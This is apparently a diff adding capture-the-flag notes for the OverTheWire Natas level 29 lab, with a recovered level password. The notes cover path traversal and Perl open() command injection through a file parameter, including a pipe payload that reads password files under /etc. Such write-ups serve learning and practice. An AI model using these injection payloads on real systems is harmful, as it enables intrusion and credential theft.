@@ -17,6 +17,7 @@ ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
 26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
 29: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+30: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
 
 check /files
 check /robots.txt
@@ -448,4 +449,22 @@ print(quote(b64encode(final)))
 
 ## natas 29
 
+perl command injection:
+
 it loads files like this `/index.pl?file=perl+underground`
+
+`http://natas29.natas.labs.overthewire.org/index.pl?file=../../../../../var/www/natas/natas30` or `/etc/natas_webpass/natas30` returns `meeep`
+
+it's interesting that it needs a space after `pwd` or `ls` to work:
+`/index.pl?file=|%20pwd%20` => /var/www/natas/natas29
+
+`/index.ph?file=| index.pl ` to get the source code.
+
+everything we request, is added a `.txt` prefix and that space kinda escapes that.
+
+```perl
+$f=param('file'); if($f=~/natas/){ print "meeeeeep!
+"; } else{ open(FD, "$f.txt"); print "
+```
+
+and obviously `|%20cat%20/etc/*_webpass/*30%20`
